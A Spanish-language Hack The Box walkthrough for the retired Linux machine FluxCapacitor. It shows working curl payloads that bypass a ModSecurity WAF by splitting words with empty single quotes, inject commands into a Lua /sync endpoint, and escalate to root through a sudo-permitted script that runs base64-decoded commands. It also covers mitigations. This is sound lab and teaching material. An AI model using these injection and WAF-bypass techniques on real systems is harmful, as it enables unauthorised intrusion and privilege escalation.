---
machine: FluxCapacitor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, command-injection, waf, sudo, lua]
---

# FluxCapacitor — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El endpoint `/sync` pasa el parámetro `opt` a `io.popen` en Lua. Un WAF bloquea caracteres y agentes habituales, pero las comillas simples y el corte de palabras permiten inyectar comandos como `nobody`. `sudo -l` autoriza un script `.monit` que decodifica base64 y ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p80 <IP>
```

- Puertos: `80/tcp` HTTP.
- Servicios: OpenResty con Lua y un WAF basado en ModSecurity.
- Tecnologías: Lua, OpenResty, ModSecurity, bash y sudo.

## Enumeración

- Página mínima con la pista `/sync`.
- El parámetro `opt` devuelve la hora del sistema.
- El WAF bloquea `;`, `|`, `$`, `(`, `)` y User-Agents de navegador.
- El comando se ejecuta como `nobody`.

## Foothold

Se rompe el contexto de comillas del comando y se separan palabras con comillas simples vacías. La respuesta refleja la salida del comando; así se enumeran usuarios y el script `.monit`.

```bash
curl "http://fluxcapacitor.htb/sync?opt=' su''do -l'"
curl "http://fluxcapacitor.htb/sync?opt=' c''at /home/themiddle/.monit'"
# El WAF exige una petición cruda; curl moderno puede necesitar --path-as-is
```

## Movimiento lateral

No hay otro host: el movimiento es del usuario `nobody` del servicio web al usuario `themiddle` y a root mediante el script autorizado.

## Escalada de privilegios

`.monit` acepta `cmd` y un base64 que decodifica y ejecuta con `bash -c`. `sudo` permite invocarlo sin contraseña como root.

```bash
PAYLOAD=$(printf 'cat /root/root.txt' | base64 -w0)
curl "http://fluxcapacitor.htb/sync?opt=' su''do /home/themiddle/.monit cmd $PAYLOAD'"
```

## Evidencia

- Salida de `id` y `sudo -l` a través de `/sync`.
- Contenido del script `.monit`.
- Lectura de un archivo privilegiado como root.

## Lecciones aprendidas

- Un WAF no corrige una concatenación de comandos.
- Los scripts privilegiados que decodifican entrada son RCE directo.
- Los filtros por caracteres se esquivan con sintaxis equivalente.

## Mitigación y detección

- No construir comandos de shell con entrada del usuario; usar APIs de proceso con argumentos.
- Eliminar `sudo` sobre scripts que aceptan comandos.
- Auditar reglas WAF y bloquear en el código, no solo en el borde.

## Referencias

- [0xdf — FluxCapacitor](https://0xdf.gitlab.io/2018/05/12/htb-fluxcapacitor.html)
- [IppSec — FluxCapacitor](https://www.youtube.com/watch?v=XLIBbkQJKuY)
- [Hack The Box — FluxCapacitor](https://app.hackthebox.com/machines/fluxcapacitor)
